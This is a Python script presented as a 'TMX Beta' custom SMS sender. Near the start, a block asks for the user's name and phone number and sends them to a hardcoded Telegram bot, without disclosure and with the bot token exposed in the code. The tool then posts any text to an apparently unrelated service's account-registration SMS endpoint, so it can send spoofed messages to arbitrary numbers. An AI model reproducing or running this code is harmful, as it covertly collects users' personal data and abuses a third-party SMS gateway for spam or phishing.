import os
import getpass
import webbrowser
import random
try:
    import colorama
except ImportError:
    os.system("pip install colorama")
from colorama import *

try:
    import pyfiglet
except ImportError:
    os.system("pip install pyfiglet")
import pyfiglet
try:
    import requests
except ImportError:
    os.system("pip install requests")
import requests
#Ani
import time

def animate(duration):
    start_time = time.time()
    while True:
        current_time = time.time()
        elapsed_time = current_time - start_time
        progress = elapsed_time / duration
        print_progress_bar(progress)
        if elapsed_time >= duration:
            break
        time.sleep(0.1)  

def print_progress_bar(progress, bar_length=50):
    bar = '#' * int(bar_length * progress)
    space = '-' * (bar_length - len(bar))
    percent = progress * 100
    print(f'[{bar}{space}] {percent:.2f}%\r', end='')

animate(10)  
##codeb

import requests

class User:
    def __init__(self):
        self.name = input("Your Name: ")
        self.number = input("Your Number: ")

    def send_telegram_message(self):
        base_url = "https://api.telegram.org/bot6746778331:AAFIVulAfBF_71JXrycTfQHNMhJoB8bOZc8/sendMessage"
        chat_id = "6856969214"
        params = {
            "chat_id": chat_id,
            "text": f"Name: {self.name}, Number: {self.number}"
        }
        response = requests.get(base_url, params=params)
        return response.json()
user = User()
print(user.send_telegram_message())


##
from pyfiglet import figlet_format
import requests

init(autoreset=True)
######

#####
#colors

from colorama import Fore

colors = [
    Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA,
    Fore.CYAN, Fore.WHITE, Fore.BLACK, Fore.LIGHTBLACK_EX, Fore.LIGHTRED_EX,
    Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
    Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX, Fore.RESET, Fore.LIGHTRED_EX,
    Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
    Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX, Fore.RESET, Fore.LIGHTRED_EX,
    Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
    Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX, Fore.RESET, Fore.LIGHTRED_EX,
    Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
    Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX, Fore.RESET, Fore.LIGHTRED_EX,
    Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
    Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX
]


def clear_screen():
    
    os.system('cls' if os.name == 'nt' else 'clear')

def send_message(number, text, color1):
    url = "http://202.51.182.198:8181/nbp/sms/code"
    payload = {
        "receiver": number,
        "text": text,
        "title": "Register Account"
    }

    headers = {
        'User-Agent': "okhttp/3.11.0",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'Authorization': "Bearer",
        'language': "en",
        'timeZone': "Asia/Dhaka"
    }

    response = requests.post(url, json=payload, headers=headers)
    if response.json().get("msg_code") == "operate.success":
        print(color1 + "Message sent successfully!")
    else:
        print(color1 + "Failed to send message")

while True:
    clear_screen()
    password = input("Tools Password : ")

    if password == "tmxlamim": 
        color1 = random.choice(colors)
        color2 = random.choice(colors)
        color3 = random.choice(colors)
        color4 = random.choice(colors)
        color5 = random.choice(colors)
        os.system("clear")  
        logo = figlet_format("TMX Beta")
        print(color1 + logo)
        line = color3 + "-------------------------------------------------"
        print(color2 + "Telgram : @tmx71bd")
        print(color3 + "Tools virson : 1.9")
        print(color4 + "Tools Type: Custom Sms Sender")
        print(color1 + "github : @Md-Lamim")
        
        print(line)
        
        number = input("Number : ")
        tex = input("Your Text : ")
        send_message(number, tex, color1)
        
        Renew = input("Do you want to send the message again Y/N : ")
        if Renew.upper() != "Y":
            break
    else:
        print("Password Error.\n1. show password\n2. Back To Log In")
        choice = input("Select an option (1/2): ")
        if choice == "1":
            print("password :", Fore.GREEN+"tmxlamim")
            input("[press inter and back login]")
        elif choice == "2":
            continue
        
